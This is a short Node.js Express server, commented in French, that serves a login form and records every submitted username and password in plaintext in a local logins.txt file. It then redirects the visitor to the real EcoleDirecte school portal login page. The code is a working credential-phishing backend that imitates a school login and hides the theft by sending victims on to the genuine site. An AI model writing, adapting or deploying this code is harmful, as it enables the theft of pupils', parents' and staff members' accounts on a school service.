const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Middleware pour lire les données POST
app.use(express.urlencoded({ extended: true }));

// Définissez le chemin de base
const basePath = '/Volumes/EOS_DIGITAL/freger';

// Route pour afficher le formulaire
app.get('/', (req, res) => {
  res.sendFile(path.join(basePath, 'Index.html'));
});

// Route pour enregistrer les informations
app.post('/save-login', (req, res) => {
  const { username, password } = req.body;
  const data = `Identifiant: ${username}, Mot de passe: ${password}\n`;

  // Chemin vers logins.txt
  const filePath = path.join(basePath, 'logins.txt');
  fs.appendFile(filePath, data, (err) => {
    if (err) {
      console.error('Erreur lors de l\'écriture dans le fichier:', err);
      res.status(500).send('Erreur serveur');
    } else {
      console.log('Données enregistrées avec succès');
      res.redirect('https://www.ecoledirecte.com/login?cameFrom=%2FAccueil');
    }
  });
});

// Démarrer le serveur
app.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
